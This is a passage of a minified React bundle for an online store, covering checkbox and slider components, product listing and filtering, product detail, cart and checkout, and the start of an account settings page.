d.jsx(qi,{present:r||Ai(s.state)||s.state===!0,children:d.jsx(pe.span,{"data-state":yN(s.state),"data-disabled":s.disabled?"":void 0,...i,ref:e,style:{pointerEvents:"none",...t.style}})})});vN.displayName=gN;var Q9=t=>{const{control:e,checked:n,bubbles:r=!0,defaultChecked:i,...s}=t,o=v.useRef(null),a=pN(n),c=jy(e);v.useEffect(()=>{const p=o.current,f=window.HTMLInputElement.prototype,E=Object.getOwnPropertyDescriptor(f,"checked").set;if(a!==n&&E){const _=new Event("click",{bubbles:r});p.indeterminate=Ai(n),E.call(p,Ai(n)?!1:n),p.dispatchEvent(_)}},[a,n,r]);const u=v.useRef(Ai(n)?!1:n);return d.jsx("input",{type:"checkbox","aria-hidden":!0,defaultChecked:i??u.current,...s,tabIndex:-1,ref:o,style:{...t.style,...c,position:"absolute",pointerEvents:"none",opacity:0,margin:0}})};function Ai(t){return t==="indeterminate"}function yN(t){return Ai(t)?"indeterminate":t?"checked":"unchecked"}var _N=mN,X9=vN;const ag=v.forwardRef(({className:t,...e},n)=>d.jsx(_N,{ref:n,className:fe("peer h-4 w-4 shrink-0 rounded-sm border border-primary ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 data-[state=checked]:bg-primary data-[state=checked]:text-primary-foreground",t),...e,children:d.jsx(X9,{className:fe("flex items-center justify-center text-current"),children:d.jsx(l1,{className:"h-4 w-4"})})}));ag.displayName=_N.displayName;function wN(t,[e,n]){return Math.min(n,Math.max(e,t))}var xN=["PageUp","PageDown"],EN=["ArrowUp","ArrowDown","ArrowLeft","ArrowRight"],CN={"from-left":["Home","PageDown","ArrowDown","ArrowLeft"],"from-right":["Home","PageDown","ArrowDown","ArrowRight"],"from-bottom":["Home","PageDown","ArrowDown","ArrowLeft"],"from-top":["Home","PageDown","ArrowUp","ArrowLeft"]},ha="Slider",[lg,J9,Z9]=hv(ha),[SN,nB]=Xo(ha,[Z9]),[e$,Qh]=SN(ha),bN=v.forwardRef((t,e)=>{const{name:n,min:r=0,max:i=100,step:s=1,orientation:o="horizontal",disabled:a=!1,minStepsBetweenThumbs:c=0,defaultValue:u=[r],value:p,onValueChange:f=()=>{},onValueCommit:h=()=>{},inverted:E=!1,form:_,...y}=t,C=v.useRef(new Set),x=v.useRef(0),S=o==="horizontal"?t$:n$,[N=[],R]=Jo({prop:p,defaultProp:u,onChange:O=>{var A;(A=[...C.current][x.current])==null||A.focus(),f(O)}}),j=v.useRef(N);function T(O){const D=a$(N,O);k(O,D)}function b(O){k(O,x.current)}function P(){const O=j.current[x.current];N[x.current]!==O&&h(N)}function k(O,D,{commit:A}={commit:!1}){const V=d$(s),Z=h$(Math.round((O-r)/s)*s+r,V),q=wN(Z,[r,i]);R((J=[])=>{const L=s$(J,q,D);if(u$(L,c*s)){x.current=L.indexOf(q);const z=String(L)!==String(J);return z&&A&&h(L),z?L:J}else return J})}return d.jsx(e$,{scope:t.__scopeSlider,name:n,disabled:a,min:r,max:i,valueIndexToChangeRef:x,thumbs:C.current,values:N,orientation:o,form:_,children:d.jsx(lg.Provider,{scope:t.__scopeSlider,children:d.jsx(lg.Slot,{scope:t.__scopeSlider,children:d.jsx(S,{"aria-disabled":a,"data-disabled":a?"":void 0,...y,ref:e,onPointerDown:ie(y.onPointerDown,()=>{a||(j.current=N)}),min:r,max:i,inverted:E,onSlideStart:a?void 0:T,onSlideMove:a?void 0:b,onSlideEnd:a?void 0:P,onHomeKeyDown:()=>!a&&k(r,0,{commit:!0}),onEndKeyDown:()=>!a&&k(i,N.length-1,{commit:!0}),onStepKeyDown:({event:O,direction:D})=>{if(!a){const Z=xN.includes(O.key)||O.shiftKey&&EN.includes(O.key)?10:1,q=x.current,J=N[q],L=s*Z*D;k(J+L,q,{commit:!0})}}})})})})});bN.displayName=ha;var[TN,IN]=SN(ha,{startEdge:"left",endEdge:"right",size:"width",direction:1}),t$=v.forwardRef((t,e)=>{const{min:n,max:r,dir:i,inverted:s,onSlideStart:o,onSlideMove:a,onSlideEnd:c,onStepKeyDown:u,...p}=t,[f,h]=v.useState(null),E=We(e,S=>h(S)),_=v.useRef(),y=Ry(i),C=y==="ltr",x=C&&!s||!C&&s;function w(S){const N=_.current||f.getBoundingClientRect(),R=[0,N.width],T=Ly(R,x?[n,r]:[r,n]);return _.current=N,T(S-N.left)}return d.jsx(TN,{scope:t.__scopeSlider,startEdge:x?"left":"right",endEdge:x?"right":"left",direction:x?1:-1,size:"width",children:d.jsx(NN,{dir:y,"data-orientation":"horizontal",...p,ref:E,style:{...p.style,"--radix-slider-thumb-transform":"translateX(-50%)"},onSlideStart:S=>{const N=w(S.clientX);o==null||o(N)},onSlideMove:S=>{const N=w(S.clientX);a==null||a(N)},onSlideEnd:()=>{_.current=void 0,c==null||c()},onStepKeyDown:S=>{const R=CN[x?"from-left":"from-right"].includes(S.key);u==null||u({event:S,direction:R?-1:1})}})})}),n$=v.forwardRef((t,e)=>{const{min:n,max:r,inverted:i,onSlideStart:s,onSlideMove:o,onSlideEnd:a,onStepKeyDown:c,...u}=t,p=v.useRef(null),f=We(e,p),h=v.useRef(),E=!i;function _(y){const C=h.current||p.current.getBoundingClientRect(),x=[0,C.height],S=Ly(x,E?[r,n]:[n,r]);return h.current=C,S(y-C.top)}return d.jsx(TN,{scope:t.__scopeSlider,startEdge:E?"bottom":"top",endEdge:E?"top":"bottom",size:"height",direction:E?1:-1,children:d.jsx(NN,{"data-orientation":"vertical",...u,ref:f,style:{...u.style,"--radix-slider-thumb-transform":"translateY(50%)"},onSlideStart:y=>{const C=_(y.clientY);s==null||s(C)},onSlideMove:y=>{const C=_(y.clientY);o==null||o(C)},onSlideEnd:()=>{h.current=void 0,a==null||a()},onStepKeyDown:y=>{const x=CN[E?"from-bottom":"from-top"].includes(y.key);c==null||c({event:y,direction:x?-1:1})}})})}),NN=v.forwardRef((t,e)=>{const{__scopeSlider:n,onSlideStart:r,onSlideMove:i,onSlideEnd:s,onHomeKeyDown:o,onEndKeyDown:a,onStepKeyDown:c,...u}=t,p=Qh(ha,n);return d.jsx(pe.span,{...u,ref:e,onKeyDown:ie(t.onKeyDown,f=>{f.key==="Home"?(o(f),f.preventDefault()):f.key==="End"?(a(f),f.preventDefault()):xN.concat(EN).includes(f.key)&&(c(f),f.preventDefault())}),onPointerDown:ie(t.onPointerDown,f=>{const h=f.target;h.setPointerCapture(f.pointerId),f.preventDefault(),p.thumbs.has(h)?h.focus():r(f)}),onPointerMove:ie(t.onPointerMove,f=>{f.target.hasPointerCapture(f.pointerId)&&i(f)}),onPointerUp:ie(t.onPointerUp,f=>{const h=f.target;h.hasPointerCapture(f.pointerId)&&(h.releasePointerCapture(f.pointerId),s(f))})})}),kN="SliderTrack",PN=v.forwardRef((t,e)=>{const{__scopeSlider:n,...r}=t,i=Qh(kN,n);return d.jsx(pe.span,{"data-disabled":i.disabled?"":void 0,"data-orientation":i.orientation,...r,ref:e})});PN.displayName=kN;var cg="SliderRange",RN=v.forwardRef((t,e)=>{const{__scopeSlider:n,...r}=t,i=Qh(cg,n),s=IN(cg,n),o=v.useRef(null),a=We(e,o),c=i.values.length,u=i.values.map(h=>ON(h,i.min,i.max)),p=c>1?Math.min(...u):0,f=100-Math.max(...u);return d.jsx(pe.span,{"data-orientation":i.orientation,"data-disabled":i.disabled?"":void 0,...r,ref:a,style:{...t.style,[s.startEdge]:p+"%",[s.endEdge]:f+"%"}})});RN.displayName=cg;var ug="SliderThumb",AN=v.forwardRef((t,e)=>{const n=J9(t.__scopeSlider),[r,i]=v.useState(null),s=We(e,a=>i(a)),o=v.useMemo(()=>r?n().findIndex(a=>a.ref.current===r):-1,[n,r]);return d.jsx(r$,{...t,ref:s,index:o})}),r$=v.forwardRef((t,e)=>{const{__scopeSlider:n,index:r,name:i,...s}=t,o=Qh(ug,n),a=IN(ug,n),[c,u]=v.useState(null),p=We(e,w=>u(w)),f=c?o.form||!!c.closest("form"):!0,h=jy(c),E=o.values[r],_=E===void 0?0:ON(E,o.min,o.max),y=o$(r,o.values.length),C=h==null?void 0:h[a.size],x=C?l$(C,_,a.direction):0;return v.useEffect(()=>{if(c)return o.thumbs.add(c),()=>{o.thumbs.delete(c)}},[c,o.thumbs]),d.jsxs("span",{style:{transform:"var(--radix-slider-thumb-transform)",position:"absolute",[a.startEdge]:`calc(${_}% + ${x}px)`},children:[d.jsx(lg.ItemSlot,{scope:t.__scopeSlider,children:d.jsx(pe.span,{role:"slider","aria-label":t["aria-label"]||y,"aria-valuemin":o.min,"aria-valuenow":E,"aria-valuemax":o.max,"aria-orientation":o.orientation,"data-orientation":o.orientation,"data-disabled":o.disabled?"":void 0,tabIndex:o.disabled?void 0:0,...s,ref:p,style:E===void 0?{display:"none"}:t.style,onFocus:ie(t.onFocus,()=>{o.valueIndexToChangeRef.current=r})})}),f&&d.jsx(i$,{name:i??(o.name?o.name+(o.values.length>1?"[]":""):void 0),form:o.form,value:E},r)]})});AN.displayName=ug;var i$=t=>{const{value:e,...n}=t,r=v.useRef(null),i=pN(e);return v.useEffect(()=>{const s=r.current,o=window.HTMLInputElement.prototype,c=Object.getOwnPropertyDescriptor(o,"value").set;if(i!==e&&c){const u=new Event("input",{bubbles:!0});c.call(s,e),s.dispatchEvent(u)}},[i,e]),d.jsx("input",{style:{display:"none"},...n,ref:r,defaultValue:e})};function s$(t=[],e,n){const r=[...t];return r[n]=e,r.sort((i,s)=>i-s)}function ON(t,e,n){const s=100/(n-e)*(t-e);return wN(s,[0,100])}function o$(t,e){return e>2?`Value ${t+1} of ${e}`:e===2?["Minimum","Maximum"][t]:void 0}function a$(t,e){if(t.length===1)return 0;const n=t.map(i=>Math.abs(i-e)),r=Math.min(...n);return n.indexOf(r)}function l$(t,e,n){const r=t/2,s=Ly([0,50],[0,r]);return(r-s(e)*n)*n}function c$(t){return t.slice(0,-1).map((e,n)=>t[n+1]-e)}function u$(t,e){if(e>0){const n=c$(t);return Math.min(...n)>=e}return!0}function Ly(t,e){return n=>{if(t[0]===t[1]||e[0]===e[1])return e[0];const r=(e[1]-e[0])/(t[1]-t[0]);return e[0]+r*(n-t[0])}}function d$(t){return(String(t).split(".")[1]||"").length}function h$(t,e){const n=Math.pow(10,e);return Math.round(t*n)/n}var DN=bN,f$=PN,p$=RN,m$=AN;const dg=v.forwardRef(({className:t,...e},n)=>d.jsxs(DN,{ref:n,className:fe("relative flex w-full touch-none select-none items-center",t),...e,children:[d.jsx(f$,{className:"relative h-2 w-full grow overflow-hidden rounded-full bg-secondary",children:d.jsx(p$,{className:"absolute h-full bg-primary"})}),d.jsx(m$,{className:"block h-5 w-5 rounded-full border-2 border-primary bg-background ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50"})]}));dg.displayName=DN.displayName;const Sp=[{id:"all",name:"All Categories"},{id:"electronics",name:"Electronics"},{id:"fashion",name:"Fashion"},{id:"home",name:"Home Goods"},{id:"accessories",name:"Accessories"},{id:"bags",name:"Bags"},{id:"new",name:"New Arrivals"},{id:"sale",name:"Sale"}],g$=()=>{var N;const[t,e]=$D(),n=t.get("category")||"all",[r,i]=v.useState([]),[s,o]=v.useState([]),[a,c]=v.useState(""),[u,p]=v.useState([0,500]),[f,h]=v.useState([n]),[E,_]=v.useState(!1),[y,C]=v.useState(!0);v.useEffect(()=>{const R=t.get("category")||"all";h([R])},[t]),v.useEffect(()=>{const R=async()=>{try{const T=await by();i(T),C(!1)}catch(T){console.error("Error fetching products:",T),C(!1)}},j=i6(T=>{i(T),C(!1)});return R(),()=>{j()}},[]),v.useEffect(()=>{const R=r.filter(j=>{var k;const T=j.name.toLowerCase().includes(a.toLowerCase())||((k=j.description)==null?void 0:k.toLowerCase().includes(a.toLowerCase()))||!1,b=j.price>=u[0]&&j.price<=u[1];let P=f.includes("all");return!P&&j.category&&(P=j.category.split(",").some(D=>f.includes(D))),T&&b&&P});o(R)},[a,u,f,r]);const x=R=>{R==="all"?(h(["all"]),e({})):(h(j=>j.includes("all")?[R]:j.includes(R)?j.filter(T=>T!==R):[...j.filter(T=>T!=="all"),R]),R!=="all"&&e({category:R}))},w=()=>{c(""),p([0,500]),h(["all"]),e({})},S=()=>d.jsx("div",{className:"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6",children:[...Array(6)].map((R,j)=>d.jsxs("div",{className:"bg-white rounded-lg overflow-hidden shadow-sm border border-gray-100",children:[d.jsx(Lt,{className:"w-full aspect-square"}),d.jsxs("div",{className:"p-4",children:[d.jsx(Lt,{className:"h-5 w-3/4 mb-2"}),d.jsx(Lt,{className:"h-4 w-1/4"})]})]},j))});return d.jsxs("div",{className:"min-h-screen flex flex-col",children:[d.jsx(Pi,{}),d.jsxs("main",{className:"flex-grow container mx-auto px-4 py-8",children:[d.jsxs("div",{className:"mb-8",children:[d.jsx("h1",{className:"text-3xl font-serif mb-4",children:f.includes("all")?"All Products":(N=Sp.find(R=>f.includes(R.id)))==null?void 0:N.name}),d.jsxs("div",{className:"flex flex-col md:flex-row md:items-center justify-between gap-4",children:[d.jsxs("div",{className:"relative w-full md:max-w-md",children:[d.jsx(c1,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400",size:18}),d.jsx(Xt,{type:"text",placeholder:"Search products...",value:a,onChange:R=>c(R.target.value),className:"pl-10"}),a&&d.jsx("button",{className:"absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600",onClick:()=>c(""),children:d.jsx(lc,{size:18})})]}),d.jsx("div",{className:"flex md:hidden",children:d.jsxs(Py,{open:E,onOpenChange:_,children:[d.jsx(MI,{asChild:!0,children:d.jsxs(oe,{variant:"outline",className:"w-full",children:[d.jsx(n2,{size:16,className:"mr-2"}),"Filters"]})}),d.jsx(Gh,{side:"right",className:"w-[300px] sm:w-[400px]",children:d.jsxs("div",{className:"py-6 h-full overflow-auto",children:[d.jsx("h3",{className:"font-medium text-lg mb-4",children:"Filters"}),d.jsxs("div",{className:"mb-6",children:[d.jsx("h4",{className:"font-medium mb-3",children:"Categories"}),d.jsx("div",{className:"space-y-2",children:Sp.map(R=>d.jsxs("div",{className:"flex items-center space-x-2",children:[d.jsx(ag,{id:`mobile-category-${R.id}`,checked:f.includes(R.id),onCheckedChange:()=>x(R.id)}),d.jsx(Jt,{htmlFor:`mobile-category-${R.id}`,children:R.name})]},R.id))})]}),d.jsxs("div",{className:"mb-6",children:[d.jsxs("h4",{className:"font-medium mb-3",children:["Price Range: $",u[0]," - $",u[1]]}),d.jsx(dg,{defaultValue:u,min:0,max:500,step:10,value:u,onValueChange:R=>p(R),className:"mb-6"})]}),d.jsx(oe,{onClick:w,variant:"outline",className:"w-full",children:"Clear Filters"})]})})]})})]})]}),d.jsxs("div",{className:"flex flex-col md:flex-row gap-8",children:[d.jsx("div",{className:"hidden md:block w-64 shrink-0",children:d.jsx("div",{className:"sticky top-24",children:d.jsxs("div",{className:"bg-white p-6 rounded-lg border border-gray-200",children:[d.jsx("h3",{className:"font-medium text-lg mb-4",children:"Filters"}),d.jsxs("div",{className:"mb-6",children:[d.jsx("h4",{className:"font-medium mb-3",children:"Categories"}),d.jsx("div",{className:"space-y-2",children:Sp.map(R=>d.jsxs("div",{className:"flex items-center space-x-2",children:[d.jsx(ag,{id:`category-${R.id}`,checked:f.includes(R.id),onCheckedChange:()=>x(R.id)}),d.jsx(Jt,{htmlFor:`category-${R.id}`,children:R.name})]},R.id))})]}),d.jsxs("div",{className:"mb-6",children:[d.jsxs("h4",{className:"font-medium mb-3",children:["Price Range: $",u[0]," - $",u[1]]}),d.jsx(dg,{defaultValue:u,min:0,max:500,step:10,value:u,onValueChange:R=>p(R),className:"mb-6"})]}),d.jsx(oe,{onClick:w,variant:"outline",className:"w-full",children:"Clear Filters"})]})})}),d.jsx("div",{className:"flex-1",children:y?S():s.length===0?d.jsxs("div",{className:"text-center py-16",children:[d.jsx("h3",{className:"text-xl font-medium mb-2",children:"No products found"}),d.jsx("p",{className:"text-gray-500 mb-4",children:"Try adjusting your search or filter criteria"}),d.jsx(oe,{onClick:w,variant:"outline",children:"Clear Filters"})]}):d.jsx("div",{className:"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6",children:s.map(R=>d.jsx(Sy,{product:R},R.id))})})]})]}),d.jsx(Ri,{})]})},v$=()=>{const{id:t}=pD(),[e,n]=v.useState(null),[r,i]=v.useState(!0),[s,o]=v.useState(1),[a,c]=v.useState([]),{increaseCartQuantity:u,getItemQuantity:p}=Tc(),[f,h]=v.useState(!1);v.useEffect(()=>{i(!0),n(null),c([]),o(1),(async()=>{if(t)try{const x=await s6(t);if(x&&(n(x),x.category)){const w=x.category.split(",")[0],N=(await o6(w)).filter(R=>R.id!==t).slice(0,4);c(N)}}catch(x){console.error("Error fetching product details:",x)}finally{i(!1)}})()},[t]),v.useEffect(()=>{e&&h(p(e.id)>0)},[e,p]);const E=()=>{o(C=>C+1)},_=()=>{o(C=>C>1?C-1:1)},y=()=>{if(e){for(let C=0;C<s;C++)u({id:e.id,name:e.name,price:e.price,image:e.image});h(!0)}};return r?d.jsxs("div",{className:"min-h-screen flex flex-col",children:[d.jsx(Pi,{}),d.jsx("main",{className:"flex-grow container mx-auto px-4 py-8",children:d.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-12",children:[d.jsx("div",{children:d.jsx(Lt,{className:"w-full aspect-square rounded-lg"})}),d.jsxs("div",{className:"space-y-4",children:[d.jsx(Lt,{className:"h-10 w-3/4"}),d.jsx(Lt,{className:"h-6 w-1/4"}),d.jsx(Lt,{className:"h-24 w-full"}),d.jsxs("div",{className:"space-y-2",children:[d.jsx(Lt,{className:"h-8 w-3/4"}),d.jsx(Lt,{className:"h-8 w-3/4"})]}),d.jsx(Lt,{className:"h-10 w-full"})]})]})}),d.jsx(Ri,{})]}):e?d.jsxs("div",{className:"min-h-screen flex flex-col",children:[d.jsx(Pi,{}),d.jsxs("main",{className:"flex-grow container mx-auto px-4 py-8",children:[d.jsx("div",{className:"text-sm breadcrumbs mb-8",children:d.jsxs("ul",{className:"flex items-center space-x-2",children:[d.jsx("li",{children:d.jsx(de,{to:"/",className:"text-gray-500 hover:text-primary",children:"Home"})}),d.jsx("li",{className:"text-gray-500",children:"/"}),d.jsx("li",{children:d.jsx(de,{to:"/products",className:"text-gray-500 hover:text-primary",children:"Products"})}),d.jsx("li",{className:"text-gray-500",children:"/"}),d.jsx("li",{className:"text-gray-900 font-medium truncate",children:e.name})]})}),d.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-12",children:[d.jsx("div",{className:"bg-gray-50 rounded-lg overflow-hidden",children:d.jsx("img",{src:e.image,alt:e.name,className:"w-full h-full object-cover"})}),d.jsxs("div",{className:"space-y-6",children:[d.jsx("h1",{className:"text-3xl font-serif",children:e.name}),d.jsxs("div",{className:"text-2xl font-medium text-primary",children:["$",e.price.toFixed(2)]}),d.jsx("p",{className:"text-gray-700",children:e.description}),d.jsxs("div",{className:"flex items-center space-x-4",children:[d.jsx("span",{className:"text-gray-700",children:"Quantity:"}),d.jsxs("div",{className:"flex items-center border border-gray-300 rounded-md",children:[d.jsx("button",{className:"px-3 py-1 hover:bg-gray-100",onClick:_,disabled:s<=1,children:d.jsx(vv,{size:16})}),d.jsx("span",{className:"px-4 py-1 border-l border-r border-gray-300 min-w-[40px] text-center",children:s}),d.jsx("button",{className:"px-3 py-1 hover:bg-gray-100",onClick:E,children:d.jsx(yv,{size:16})})]})]}),d.jsx(oe,{className:"w-full",size:"lg",onClick:y,disabled:f,children:f?d.jsxs(d.Fragment,{children:[d.jsx(l1,{size:18,className:"mr-2"}),"Added to Cart"]}):d.jsxs(d.Fragment,{children:[d.jsx(u1,{size:18,className:"mr-2"}),"Add to Cart"]})}),d.jsx("div",{className:"pt-8",children:d.jsxs(Dy,{defaultValue:"details",children:[d.jsxs(Yh,{className:"grid w-full grid-cols-3",children:[d.jsx(Tr,{value:"details",children:"Details"}),d.jsx(Tr,{value:"shipping",children:"Shipping"}),d.jsx(Tr,{value:"returns",children:"Returns"})]}),d.jsx(_s,{value:"details",className:"pt-4",children:d.jsxs("div",{className:"space-y-4",children:[d.jsx("h4",{className:"font-medium",children:"Product Details"}),d.jsx("p",{className:"text-gray-600",children:e.description}),d.jsxs("ul",{className:"list-disc list-inside space-y-1 text-gray-600",children:[d.jsx("li",{children:"High-quality materials"}),d.jsx("li",{children:"Durable construction"}),d.jsx("li",{children:"Premium finish"}),d.jsx("li",{children:"Designed for everyday use"})]})]})}),d.jsx(_s,{value:"shipping",className:"pt-4",children:d.jsxs("div",{className:"space-y-4",children:[d.jsx("h4",{className:"font-medium",children:"Shipping Information"}),d.jsx("p",{className:"text-gray-600",children:"We ship worldwide with various delivery options:"}),d.jsxs("ul",{className:"list-disc list-inside space-y-1 text-gray-600",children:[d.jsx("li",{children:"Standard Shipping: 5-7 business days"}),d.jsx("li",{children:"Express Shipping: 2-3 business days"}),d.jsx("li",{children:"Free shipping on orders over $100"}),d.jsx("li",{children:"International shipping available"})]})]})}),d.jsx(_s,{value:"returns",className:"pt-4",children:d.jsxs("div",{className:"space-y-4",children:[d.jsx("h4",{className:"font-medium",children:"Return Policy"}),d.jsx("p",{className:"text-gray-600",children:"We want you to be completely satisfied with your purchase:"}),d.jsxs("ul",{className:"list-disc list-inside space-y-1 text-gray-600",children:[d.jsx("li",{children:"30-day return policy"}),d.jsx("li",{children:"Items must be unused and in original packaging"}),d.jsx("li",{children:"Return shipping covered for defective items"}),d.jsx("li",{children:"Exchanges available for wrong sizes"})]})]})})]})})]})]}),a.length>0&&d.jsxs("section",{className:"mt-16",children:[d.jsx("h2",{className:"text-2xl font-serif mb-8",children:"You May Also Like"}),d.jsx("div",{className:"grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6",children:a.map(C=>d.jsx(Sy,{product:C},C.id))})]})]}),d.jsx(Ri,{})]}):d.jsxs("div",{className:"min-h-screen flex flex-col",children:[d.jsx(Pi,{}),d.jsxs("main",{className:"flex-grow container mx-auto px-4 py-16 text-center",children:[d.jsx("h2",{className:"text-2xl font-medium mb-4",children:"Product Not Found"}),d.jsx("p",{className:"text-gray-600 mb-8",children:"The product you're looking for doesn't exist or has been removed."}),d.jsx(oe,{asChild:!0,children:d.jsx(de,{to:"/products",children:"Continue Shopping"})})]}),d.jsx(Ri,{})]})},y$=()=>{const{cartItems:t,cartTotal:e,increaseCartQuantity:n,decreaseCartQuantity:r,removeFromCart:i,clearCart:s}=Tc(),{currentUser:o}=da(),a=uc(),c=()=>{if(!o){Te({title:"Sign in required",description:"Please sign in to your account to checkout",variant:"destructive"});return}Te({title:"Order placed!",description:"Thank you for your purchase."}),s(),a("/")};return t.length===0?d.jsxs("div",{className:"min-h-screen flex flex-col",children:[d.jsx(Pi,{}),d.jsx("main",{className:"flex-grow container mx-auto px-4 py-16 text-center",children:d.jsxs("div",{className:"max-w-md mx-auto",children:[d.jsx("div",{className:"flex justify-center mb-6",children:d.jsx("div",{className:"w-20 h-20 rounded-full bg-primary/10 flex items-center justify-center",children:d.jsx(Dl,{className:"h-10 w-10 text-primary"})})}),d.jsx("h1",{className:"text-2xl font-serif mb-4",children:"Your cart is empty"}),d.jsx("p",{className:"text-gray-600 mb-8",children:"Looks like you haven't added anything to your cart yet."}),d.jsx(oe,{asChild:!0,children:d.jsx(de,{to:"/products",children:"Continue Shopping"})})]})}),d.jsx(Ri,{})]}):d.jsxs("div",{className:"min-h-screen flex flex-col",children:[d.jsx(Pi,{}),d.jsxs("main",{className:"flex-grow container mx-auto px-4 py-8",children:[d.jsx("h1",{className:"text-3xl font-serif mb-8",children:"Shopping Cart"}),d.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-3 gap-8",children:[d.jsx("div",{className:"lg:col-span-2",children:d.jsxs("div",{className:"bg-white rounded-lg border border-gray-200 overflow-hidden",children:[d.jsxs("div",{className:"hidden md:grid grid-cols-12 gap-4 p-4 border-b border-gray-200 bg-gray-50 text-sm font-medium text-gray-500",children:[d.jsx("div",{className:"col-span-6",children:"Product"}),d.jsx("div",{className:"col-span-2 text-center",children:"Price"}),d.jsx("div",{className:"col-span-2 text-center",children:"Quantity"}),d.jsx("div",{className:"col-span-2 text-right",children:"Total"})]}),d.jsx("div",{className:"divide-y divide-gray-200",children:t.map(u=>d.jsxs("div",{className:"p-4 md:grid md:grid-cols-12 md:gap-4 md:items-center",children:[d.jsxs("div",{className:"md:col-span-6 flex items-center",children:[d.jsx("div",{className:"w-20 h-20 bg-gray-100 rounded-md overflow-hidden flex-shrink-0",children:d.jsx("img",{src:u.image,alt:u.name,className:"w-full h-full object-cover"})}),d.jsxs("div",{className:"ml-4",children:[d.jsx(de,{to:`/product/${u.id}`,className:"font-medium text-gray-900 hover:text-primary",children:u.name}),d.jsxs("div",{className:"md:hidden mt-1 flex justify-between",children:[d.jsxs("span",{className:"text-gray-500",children:["$",u.price.toFixed(2)]}),d.jsxs("span",{className:"font-medium",children:["$",(u.price*u.quantity).toFixed(2)]})]})]})]}),d.jsxs("div",{className:"hidden md:block md:col-span-2 text-center",children:["$",u.price.toFixed(2)]}),d.jsx("div",{className:"md:col-span-2 md:text-center mt-4 md:mt-0",children:d.jsxs("div",{className:"flex items-center justify-center border border-gray-300 rounded-md max-w-[120px] mx-auto",children:[d.jsx("button",{className:"px-3 py-1 hover:bg-gray-100",onClick:()=>r(u.id),children:d.jsx(vv,{size:16})}),d.jsx("span",{className:"px-2 py-1 border-l border-r border-gray-300 min-w-[40px] text-center",children:u.quantity}),d.jsx("button",{className:"px-3 py-1 hover:bg-gray-100",onClick:()=>n({id:u.id,name:u.name,price:u.price,image:u.image}),children:d.jsx(yv,{size:16})})]})}),d.jsxs("div",{className:"md:col-span-2 md:text-right mt-2 md:mt-0 flex items-center justify-between",children:[d.jsx("div",{className:"md:hidden",children:d.jsx("button",{className:"text-gray-400 hover:text-red-500",onClick:()=>i(u.id),children:d.jsx(Sm,{size:18})})}),d.jsxs("div",{className:"hidden md:block",children:["$",(u.price*u.quantity).toFixed(2)]}),d.jsx("div",{className:"hidden md:block",children:d.jsx("button",{className:"text-gray-400 hover:text-red-500",onClick:()=>i(u.id),children:d.jsx(Sm,{size:18})})})]})]},u.id))}),d.jsxs("div",{className:"p-4 border-t border-gray-200 flex justify-between",children:[d.jsx(oe,{variant:"outline",onClick:s,size:"sm",children:"Clear Cart"}),d.jsx(oe,{variant:"link",asChild:!0,className:"text-primary",children:d.jsx(de,{to:"/products",children:"Continue Shopping"})})]})]})}),d.jsx("div",{className:"lg:col-span-1",children:d.jsxs("div",{className:"bg-white rounded-lg border border-gray-200 p-6 sticky top-24",children:[d.jsx("h2",{className:"text-xl font-medium mb-4",children:"Order Summary"}),d.jsxs("div",{className:"space-y-2 mb-6",children:[d.jsxs("div",{className:"flex justify-between",children:[d.jsx("span",{className:"text-gray-600",children:"Subtotal"}),d.jsxs("span",{children:["$",e.toFixed(2)]})]}),d.jsxs("div",{className:"flex justify-between",children:[d.jsx("span",{className:"text-gray-600",children:"Shipping"}),d.jsx("span",{children:"Free"})]}),d.jsxs("div",{className:"border-t border-gray-200 pt-2 mt-2 flex justify-between font-medium",children:[d.jsx("span",{children:"Total"}),d.jsxs("span",{children:["$",e.toFixed(2)]})]})]}),d.jsxs(oe,{className:"w-full",size:"lg",onClick:c,children:["Checkout",d.jsx(a1,{size:16,className:"ml-2"})]}),d.jsx("p",{className:"text-xs text-gray-500 mt-4 text-center",children:"Taxes calculated at checkout. Shipping calculated based on delivery address."})]})})]})]}),d.jsx(Ri,{})]})},Vu=v.forwardRef(({className:t,...e},n)=>d.jsx("div",{ref:n,className:fe("rounded-lg border bg-card text-card-foreground shadow-sm",t),...e}));Vu.displayName="Card";const Hu=v.forwardRef(({className:t,...e},n)=>d.jsx("div",{ref:n,className:fe("flex flex-col space-y-1.5 p-6",t),...e}));Hu.displayName="CardHeader";const Wu=v.forwardRef(({className:t,...e},n)=>d.jsx("h3",{ref:n,className:fe("text-2xl font-semibold leading-none tracking-tight",t),...e}));Wu.displayName="CardTitle";const Ku=v.forwardRef(({className:t,...e},n)=>d.jsx("p",{ref:n,className:fe("text-sm text-muted-foreground",t),...e}));Ku.displayName="CardDescription";const Gu=v.forwardRef(({className:t,...e},n)=>d.jsx("div",{ref:n,className:fe("p-6 pt-0",t),...e}));Gu.displayName="CardContent";const hg=v.forwardRef(({className:t,...e},n)=>d.jsx("div",{ref:n,className:fe("flex items-center p-6 pt-0",t),...e}));hg.displayName="CardFooter";const _$=()=>{var b,P;const{currentUser:t,userProfile:e,logout:n,updateProfile:r,refreshUserFromToken:i}=da(),s=uc(),[o,a]=v.useState(((b=e==null?void 0:e.displayName)==null?void 0:b.split(" ")[0])||""),[c,u]=v.useState(((P=e==null?void 0:e.displayName)==null?void 0:P.split(" ")[1])||""),[p,f]=v.useState((e==null?void 0:e.phone)||""),[h,E]=v.useState([]),[_,y]=v.useState(""),[C,x]=v.useState(""),[w,S]=v.useState("");if(H.useEffect(()=>{t||s("/")},[t,s]),H.useEffect(()=>{if(t)return Cy(`orders/${t.uid}`,O=>{if(O){const D=Object.entries(O).map(([A,V])=>({id:A,...V}));E(D)}else E([])})},[t]),!t)return null;const N=async()=>{try{await r({displayName:`${o} ${c}`.trim(),phone:p})}catch(k){console.error("Error updating profile:",k)}},R=async()=>{if(C!==w){Te({title:"Passwords don't match",description:"New password and confirmation must match.",variant:"destructive"});return}if(C.length<6){Te({title:"Password too 